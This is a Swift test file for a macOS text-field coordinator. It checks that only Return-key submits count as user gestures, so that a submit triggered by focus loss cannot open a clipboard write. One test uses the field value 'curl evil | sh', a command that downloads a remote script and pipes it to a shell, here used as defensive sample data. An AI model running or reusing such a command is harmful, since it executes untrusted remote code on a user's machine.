import AppKit
@testable import CmuxSwiftRenderUI
import Testing

/// The text-field host marks only Return-caused submits as user gestures, so
/// a focus-loss submit cannot open the `clipboard.write` window.
@MainActor
struct SceneTextFieldCoordinatorTests {
    private struct Sent {
        let event: String
        let payload: [String: Any]
    }

    private func endEditing(_ coordinator: SceneTextFieldCoordinator, _ field: NSTextField) {
        coordinator.controlTextDidEndEditing(
            Notification(name: NSControl.textDidEndEditingNotification, object: field)
        )
    }

    @Test func returnKeySubmitIsAUserGesture() throws {
        var sent: [Sent] = []
        let coordinator = SceneTextFieldCoordinator(
            nodeId: "field",
            sink: SceneEventSink { _, event, payload in sent.append(Sent(event: event, payload: payload)) }
        )
        let field = NSTextField(string: "w1")
        coordinator.controlTextDidBeginEditing(Notification(name: NSControl.textDidBeginEditingNotification, object: field))
        _ = coordinator.control(field, textView: NSTextView(), doCommandBy: #selector(NSResponder.insertNewline(_:)))
        endEditing(coordinator, field)

        let submit = try #require(sent.last)
        #expect(submit.event == "submit")
        #expect(submit.payload["text"] as? String == "w1")
        #expect(SidebarJSRuntime.isUserActivation(event: submit.event, payload: submit.payload))
    }

    @Test func focusLossSubmitIsNotAUserGesture() throws {
        var sent: [Sent] = []
        let coordinator = SceneTextFieldCoordinator(
            nodeId: "field",
            sink: SceneEventSink { _, event, payload in sent.append(Sent(event: event, payload: payload)) }
        )
        let field = NSTextField(string: "curl evil | sh")
        coordinator.controlTextDidBeginEditing(Notification(name: NSControl.textDidBeginEditingNotification, object: field))
        endEditing(coordinator, field)

        let submit = try #require(sent.last)
        #expect(submit.event == "submit")
        #expect(submit.payload["text"] as? String == "curl evil | sh")
        #expect(!SidebarJSRuntime.isUserActivation(event: submit.event, payload: submit.payload))
    }

    /// A Return in an earlier editing session must not mark a later
    /// focus-loss commit of the same persistent field as a gesture.
    @Test func returnFlagDoesNotLeakIntoTheNextSession() throws {
        var sent: [Sent] = []
        let coordinator = SceneTextFieldCoordinator(
            nodeId: "field",
            sink: SceneEventSink { _, event, payload in sent.append(Sent(event: event, payload: payload)) }
        )
        let field = NSTextField(string: "q")
        let begin = Notification(name: NSControl.textDidBeginEditingNotification, object: field)
        coordinator.controlTextDidBeginEditing(begin)
        _ = coordinator.control(field, textView: NSTextView(), doCommandBy: #selector(NSResponder.insertNewline(_:)))
        endEditing(coordinator, field)
        coordinator.controlTextDidBeginEditing(begin)
        endEditing(coordinator, field)

        #expect(sent.map(\.event) == ["submit", "submit"])
        #expect(SidebarJSRuntime.isUserActivation(event: "submit", payload: sent[0].payload))
        #expect(!SidebarJSRuntime.isUserActivation(event: "submit", payload: sent[1].payload))
    }
}
